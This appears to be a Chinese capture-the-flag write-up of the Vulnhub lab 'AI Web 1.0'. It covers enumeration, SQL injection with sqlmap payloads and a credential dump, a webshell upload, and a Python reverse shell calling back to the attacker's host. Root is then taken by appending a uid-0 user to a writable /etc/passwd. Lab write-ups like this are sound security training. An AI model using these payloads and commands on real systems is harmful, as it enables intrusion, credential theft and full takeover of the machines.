---
title: "AI Web 1.0 Vulnhub靶场复现-重走来时路"
description: "这是大一组织打的第一个渗透靶场，现在重新打一遍"
slug: "vulnhub-aiweb1-0"
pubDate: "2026-07-11"
type: "writeup"
tags: ["Vulnhub"]
lang: "zh-CN"
---

# AI Web 1.0 Vulnhub靶场复现-重走来时路

## 主机发现

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sn 10.10.10.0/24
[sudo] kali 的密码：
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-09 13:08 -0400
Nmap scan report for 10.10.10.1
Host is up (0.00035s latency).
MAC Address: 00:50:56:C0:00:08 (VMware)
Nmap scan report for 10.10.10.2
Host is up (0.00018s latency).
MAC Address: 00:50:56:F0:E1:42 (VMware)
Nmap scan report for 10.10.10.129
Host is up (0.00013s latency).
MAC Address: 00:0C:29:52:0E:F1 (VMware)
Nmap scan report for 10.10.10.254
Host is up (0.00022s latency).
MAC Address: 00:50:56:FD:4D:07 (VMware)
Nmap scan report for 10.10.10.10
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 7.44 seconds
```

命令讲解

-sn --->(no port scan) 无端口扫描 作用是仅对主机进行存活嗅探，不进行端口扫描

sudo 的作用

1. 发送**原始数据包**，组合使用多种探测技术进行扫描
2. 会使用ICMP Echo请求、TCP SYN/ACK探测
3. 高效，能绕过某些防火墙规则，但网络足迹更明显

不加sudo的特点（不仅是权限的不同）

1. 使用系统`connect()`系统调用
2. TCP connect（）扫描
3. 会建立完整的TCP三次握手，网络足迹更常规，类似普通网络连接

## 端口扫描

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/AIWeb1]
└─$ sudo nmap -sT -sV -sC -O -p-  10.10.10.129
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-10 11:29 -0400
Nmap scan report for 10.10.10.129
Host is up (0.00061s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd
| http-robots.txt: 2 disallowed entries
|_/m3diNf0/ /se3reTdir777/uploads/
|_http-server-header: Apache
|_http-title: AI Web 1.0
MAC Address: 00:0C:29:52:0E:F1 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.44 seconds

```

| 参数 | 作用              |
| ---- | ----------------- |
| -sT  | TCP connect扫描   |
| -sV  | 服务版本检测      |
| -sC  | 默认脚本扫描      |
| -O   | 操作系统识别      |
| -p-  | 扫描所以65535端口 |

获取到的信息

1. 仅80端口开放http协议
2. 默认脚本扫出robots.txt中禁止爬取的两条路径，访问后均显示没有权限访问该页面

## 目录爆破

访问80端口页面仅显示一句话Not even Google search my contents!**连谷歌都搜不到我的内容！**

进行web 目录爆破

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/AIWeb1]
└─$ gobuster dir -u 10.10.10.129 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.129
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htpasswd            (Status: 403) [Size: 218]
.htaccess            (Status: 403) [Size: 218]
.hta                 (Status: 403) [Size: 213]
index.html           (Status: 200) [Size: 141]
robots.txt           (Status: 200) [Size: 82]
server-status        (Status: 403) [Size: 222]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================

```

没什么用

那就再爆破给的两个路径

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/AIWeb1]
└─$ gobuster dir -u 10.10.10.129/m3diNf0 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.129/m3diNf0
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 221]
.htpasswd            (Status: 403) [Size: 226]
.htaccess            (Status: 403) [Size: 226]
info.php             (Status: 200) [Size: 84168]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

暴露出来了info.php 路径

## 信息泄露

这个路径是干什么的？

会将当前服务器环境的所有配置细节一股脑地打印出来

访问得到
DOCUMENT_ROOT = /home/www/html/web1x443290o2sdf92213
为后续漏洞利用做铺垫

继续爆破

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/AIWeb1]
└─$ gobuster dir -u 10.10.10.129/se3reTdir777/uploads/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.129/se3reTdir777/uploads/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 234]
.htpasswd            (Status: 403) [Size: 239]
.htaccess            (Status: 403) [Size: 239]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

啥也没有

扫描父目录

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/AIWeb1]
└─$ gobuster dir -u 10.10.10.129/se3reTdir777 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.129/se3reTdir777
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 226]
.htaccess            (Status: 403) [Size: 231]
.htpasswd            (Status: 403) [Size: 231]
index.php            (Status: 200) [Size: 1228]
uploads              (Status: 301) [Size: 249] [--> http://10.10.10.129/se3reTdir777/uploads/]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

暴露出来一个index.php，于是我们访问一个10.10.10.129/se3reTdir777/index.php 打开是一个表单，尝试抓包

```text
POST /se3reTdir777/index.php HTTP/1.1
Host: 10.10.10.129
Content-Length: 22
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
Origin: http://10.10.10.129
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.10.129/se3reTdir777/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

uid=1&Operation=Submit
```

发送到重放器，并修改uid 1是admin 2 是 root 3 mysql

可知uid参数参与了后端查询

继续尝试并判断有没有sql注入的可能，结果如下

uid=' -> SQL syntax error
uid=1' -> no result
uid=1-- -> admin
uid=1# -> admin
uid=1 OR 1=1 -> admin
1’ -- - -> admin
uid= '报错具体如下

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1

然后再尝试 1’ -- - 还是返回admin

基本可以确认是sql注入了

## SQL 注入分析

原始 SQL（推测）

SELECT * FROM users WHERE uid='$uid';

正常输入：

uid=1

SELECT * FROM users WHERE uid='1';

结果：

admin

---

输入：

uid='

SQL 结构被破坏

MySQL 返回语法错误

---

输入：

uid=1' -- -

SELECT * FROM users WHERE uid='1' -- -';

注释掉后续 SQL

数据库实际执行：

SELECT * FROM users WHERE uid='1';

返回：admin

由此说明这是一个字符型SQL注入

## SQLMap利用

将请求头复制并保存

```text
POST /se3reTdir777/index.php HTTP/1.1
Host: 10.10.10.129
Content-Length: 22
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
Origin: http://10.10.10.129
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.10.129/se3reTdir777/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

uid=1&Operation=Submit
```

然后打开kail 输入 sqlmap -r 加上刚把请求头保存的路径

```shell
sqlmap identified the following injection point(s) with a total of 3897 HTTP(s) requests:
---
Parameter: uid (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: uid=1' OR NOT 9203=9203#&Operation=Submit

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: uid=1' AND EXTRACTVALUE(4923,CONCAT(0x5c,0x717a7a7a71,(SELECT (ELT(4923=4923,1))),0x716a626b71))-- Pagv&Operation=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uid=1' AND (SELECT 7969 FROM (SELECT(SLEEP(5)))UATH)-- aAdq&Operation=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: uid=1' UNION ALL SELECT CONCAT(0x717a7a7a71,0x45525268796c6a6f5a47576d7768764d4f4a65765462584d5a6c4d7043714c594a426b71426b7274,0x716a626b71),NULL,NULL#&Operation=Submit
---
[12:53:03] [INFO] the back-end DBMS is MySQL
web application technology: Apache
back-end DBMS: MySQL >= 5.1
[12:53:03] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.10.129'

[*] ending @ 12:53:03 /2026-07-10/
```

这次SQL注入类型

- “boolean blind”（布尔盲注）
- “error based”（报错注入）
- “time based”（时间盲注）
- “UNION query”（联合查询注入）

## 数据库脱库

```shell
Database: aiweb1
Table: systemUser
[3 entries]
+----+----------------------------------------------+-----------+
| id | password                                     | userName  |
+----+----------------------------------------------+-----------+
| 1  | RmFrZVVzZXJQYXNzdzByZA==                     | t00r      |
| 2  | TXlFdmlsUGFzc19mOTA4c2RhZjlfc2FkZmFzZjBzYQ== | aiweb1pwn |
| 3  | TjB0VGhpczBuZUFsczA=                         | u3er      |
+----+----------------------------------------------+-----------+
```

判断均为base64
FakeUserPassword
MyEvilPass_f908sdaf9_sadfasf0sa
N0tThis0neAls0

```shell
Database: aiweb1
Table: user
[3 entries]
+-----------+----+----------+
| firstName | id | lastName |
+-----------+----+----------+
| admin     | 1  | admin    |
| root      | 2  | root     |                                               | mysql     | 3  | mysql    |
+-----------+----+----------+
```

## 数据库信息收集

疑似后台用户表 但未发现登录入口 继续寻找利用点

曾经获取的绝对路径+上传路径这个信息这两个敏感信息还没利用，验证是否有写入文件并上传的可能

执行

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/AIWeb1/requests]                            └─$ sqlmap -r requestaiweb1.txt --current-user --is-dba --privileges
```

得到

current user: 'aiweb1user@localhost'
current user is DBA: False
privilege: FILE

解读

| 检查项     | 结果                 | 含义                                                                                                        |
| ---------- | -------------------- | ----------------------------------------------------------------------------------------------------------- |
| 当前用户   | aiweb1user@localhost | 一个普通用户                                                                                                |
| 是否是 DBA | False                | 不是数据库管理员无法直接通过 `UDF` 提权（这是一种数据库提权方式），但这**完全不影响**我们写 Webshell。      |
| FILE 权限  | FILE                 | 这是最重要的信息！ FILE 权限允许数据库用户使用 INTO OUTFILE 和 LOAD_FILE 函数，即读取和写入服务器文件系统。 |

## 获取WebShell

于是执行 sqlmap -r requestaiweb1.txt --os--shell

```shellwhich web application language does the web server support?
[1] ASP
[2] ASPX
[3] CFM
[4] JSP
[5] PHP (default)
> 5
do you want sqlmap to further try to provoke the full path disclosure? [Y/n] y
[14:13:07] [WARNING] unable to automatically retrieve the web server document root
what do you want to use for writable directory?
[1] common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs, /usr/local/var/www, /usr/share/nginx/html') (default)
[2] custom location(s)
[3] custom directory list file
[4] brute force search
> 2
please provide a comma separate list of absolute directory paths: /home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/
[14:13:26] [INFO] retrieved web server absolute paths: '/se3reTdir777/index~.php'
[14:13:26] [INFO] trying to upload the file stager on '/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/' via LIMIT 'LINES TERMINATED BY' method
[14:13:26] [INFO] the file stager has been successfully uploaded on '/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/' - http://10.10.10.129:80/se3reTdir777/uploads/tmputwvt.php
[14:13:26] [INFO] the backdoor has been successfully uploaded on '/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/' - http://10.10.10.129:80/se3reTdir777/uploads/tmpbzgxj.php
[14:13:26] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> whoami
do you want to retrieve the command standard output? [Y/n/a] y
command standard output: 'www-data'
os-shell> id
do you want to retrieve the command standard output? [Y/n/a] y
command standard output: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'
os-shell>


```

## 反弹Shell

开一个新窗口用于监听

```shell
nc -lvnp 4444
```

os-shell> 中输入
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

10.10.10.10 是我的kali ip

于是监听到了

## 权限提升

```shell
www-data@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads$ whoami
</web1x443290o2sdf92213/se3reTdir777/uploads$ whoami
www-data
www-data@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads$ pwd
<tml/web1x443290o2sdf92213/se3reTdir777/uploads$ pwd
/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads
www-data@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads$ ls
ls
tmpbzgxj.php  tmputwvt.php
www-data@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads$ uname -a
<eb1x443290o2sdf92213/se3reTdir777/uploads$ uname -a
Linux aiweb1 4.15.0-58-generic #64-Ubuntu SMP Tue Aug 6 11:12:41 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
www-data@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads$ cat /etc/issue
<3290o2sdf92213/se3reTdir777/uploads$ cat /etc/issue
Ubuntu 18.04.3 LTS \n \l

www-data@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads$ cat /etc/passwd
<290o2sdf92213/se3reTdir777/uploads$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
aiweb1:x:1000:1000:AIWEB1:/home/aiweb1:/bin/bash
mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
aiweb1pwn:x:1001:1001::/home/aiweb1pwn:/bin/sh
www-data@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads$
```

这是在shell中的一些信息收集

注意到有个aiweb1pwn 这是脱库遇到的内容，尝试切换用户

```shell
www-data@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads$ su aiweb1pwn
<443290o2sdf92213/se3reTdir777/uploads$ su aiweb1pwn
Password: MyEvilPass_f908sdaf9_sadfasf0sa

$ whoami
whoami
aiweb1pwn

```

切换成功，开始尝试提升到root

```shell
$ sudo -l
sudo -l
[sudo] password for aiweb1pwn: MyEvilPass_f908sdaf9_sadfasf0sa

Sorry, user aiweb1pwn may not run sudo on aiweb1.
$
```

sudo提权失败，尝试suid

```shell
$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null
/snap/core/7270/bin/mount
/snap/core/7270/bin/ping
/snap/core/7270/bin/ping6
/snap/core/7270/bin/su
/snap/core/7270/bin/umount
/snap/core/7270/usr/bin/chfn
/snap/core/7270/usr/bin/chsh
/snap/core/7270/usr/bin/gpasswd
/snap/core/7270/usr/bin/newgrp
/snap/core/7270/usr/bin/passwd
/snap/core/7270/usr/bin/sudo
/snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/7270/usr/lib/openssh/ssh-keysign
/snap/core/7270/usr/lib/snapd/snap-confine
/snap/core/7270/usr/sbin/pppd
/snap/core/7396/bin/mount
/snap/core/7396/bin/ping
/snap/core/7396/bin/ping6
/snap/core/7396/bin/su
/snap/core/7396/bin/umount
/snap/core/7396/usr/bin/chfn
/snap/core/7396/usr/bin/chsh
/snap/core/7396/usr/bin/gpasswd
/snap/core/7396/usr/bin/newgrp
/snap/core/7396/usr/bin/passwd
/snap/core/7396/usr/bin/sudo
/snap/core/7396/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/7396/usr/lib/openssh/ssh-keysign
/snap/core/7396/usr/lib/snapd/snap-confine
/snap/core/7396/usr/sbin/pppd
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/at
/usr/bin/passwd
/usr/bin/traceroute6.iputils
/usr/bin/chsh
/bin/su
/bin/mount
/bin/ping
/bin/fusermount
/bin/umount

```

检查过lxd提权，不行

切换账户aiweb1账户失败,查看他的home目录

```$ ls -la /home/aiweb1
ls -la /home/aiweb1
total 28
drwxr-xr-x 4 aiweb1 aiweb1 4096 Aug 20  2019 .
drwxr-xr-x 4 root   root   4096 Aug 20  2019 ..
-rw------- 1 aiweb1 aiweb1    0 Aug 21  2019 .bash_history
-rw-r--r-- 1 aiweb1 aiweb1  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 aiweb1 aiweb1 3771 Apr  4  2018 .bashrc
drwx------ 2 aiweb1 aiweb1 4096 Aug 20  2019 .cache
drwx------ 3 aiweb1 aiweb1 4096 Aug 20  2019 .gnupg
-rw-r--r-- 1 root   root      0 Aug 21  2019 .mysql_history
-rw-r--r-- 1 aiweb1 aiweb1  807 Apr  4  2018 .profile
-rw-r--r-- 1 aiweb1 aiweb1    0 Aug 20  2019 .sudo_as_admin_successful
-rw-r--r-- 1 root   root      0 Aug 21  2019 .viminfo
$

```

```shell
$ ls -l /etc/passwd
ls -l /etc/passwd
-rw-r--r-- 1 www-data www-data 1664 Aug 21  2019 /etc/passwd
```

这时回头又发现，这个文件www-data有修改权限，先退出aiweb1pwn的账户，然后再构造一个uid=0的用户

```shell
$ exit
exit
www-data@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads$ openssl passwd -1 -salt root password
<r777/uploads$ openssl passwd -1 -salt root password
$1$root$1fvaXuILgb4rdRlHdQ80N/
www-data@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads$ echo 'ke1th:$1$root$1fvaXuILgb4rdRlHdQ80N/:0:0:ke1th:/root:/bin/bash' >> /etc/passwd
<RlHdQ80N/:0:0:ke1th:/root:/bin/bash' >> /etc/passwd
www-data@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads$ tail /etc/passwd
<90o2sdf92213/se3reTdir777/uploads$ tail /etc/passwd
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
aiweb1:x:1000:1000:AIWEB1:/home/aiweb1:/bin/bash
mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
aiweb1pwn:x:1001:1001::/home/aiweb1pwn:/bin/sh
ke1th:$1$root$1fvaXuILgb4rdRlHdQ80N/:0:0:ke1th:/root:/bin/bash
www-data@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads$
```

切换到新建的账户

```shell
www-data@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads$ su ke1th
<eb1x443290o2sdf92213/se3reTdir777/uploads$ su ke1th
Password: password

root@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads# id
id
uid=0(root) gid=0(root) groups=0(root)
root@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads# whoami
whoami
root
root@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads#
```

## 拿到flag

```shell
root@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads# ls -la /root
<443290o2sdf92213/se3reTdir777/uploads# ls -la /root
total 40
drwx------  6 root root 4096 Aug 20  2019 .
drwxr-xr-x 24 root root 4096 Aug 20  2019 ..
-rw-------  1 root root  273 Aug 21  2019 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Aug 20  2019 .cache
-rw-r--r--  1 root root  709 Aug 20  2019 flag.txt
drwx------  3 root root 4096 Aug 20  2019 .gnupg
-rw-------  1 root root    0 Aug 21  2019 .mysql_history
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Aug 20  2019 .ssh
drwxr-xr-x  2 root root 4096 Aug 20  2019 .vim
-rw-------  1 root root    0 Aug 21  2019 .viminfo
root@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads# cat /root/flag.txt
<o2sdf92213/se3reTdir777/uploads# cat /root/flag.txt
####################################################
#                                                  #
#                AI: WEB 1.0                       #
#                                                  #
#              Congratulation!!!                   #
#                                                  #
#      Thank you for penetrate my system.          #
#                                                  #
#            Hope you enjoyed this.                #
#                                                  #
#                                                  #
#  flag{cbe5831d864cbc2a104e2c2b9dfb50e5acbdee71}  #
#                                                  #
####################################################
root@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads#

```

## 总结

信息收集Nmap扫描->robots.txt泄露隐藏目录->对泄露目录父目录爆破->获得一个info.php,一个无权限访问的上传路径，一个父目录的index-> info泄露php apache版本 web根目录->index是一个表单，burp抓包分析uid参数，确认sql注入类型->跑sqlmap进行脱库->确认数据库用户权限->结合根目录+上传路径写入webwell->RCE
